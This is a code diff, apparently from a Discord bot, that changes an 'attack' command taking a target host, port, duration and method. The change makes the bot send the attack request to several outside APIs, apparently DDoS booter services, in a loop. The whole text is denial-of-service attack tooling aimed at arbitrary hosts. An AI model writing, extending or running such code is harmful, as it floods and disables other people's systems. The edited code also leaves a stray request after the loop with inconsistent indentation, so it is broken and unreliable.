@@ -116,11 +116,14 @@ async def attack(ctx, host: str, port: int, attack_time: int, method: str):
 ]
 
 
-    api_url = f'{api_urls}&target={host}&port={port}&time={attack_time}&method={method}'
-    
+
     if attack_time > 300:
         await ctx.send("Max Time is 300 Seconds.")
         return
+
+    for api_url in api_urls:
+        url = f"{api_url}&target={host}&port={port}&time={attack_time}&method={method}"
+        response = requests.get(url)
         
         
     response = requests.get(api_url)
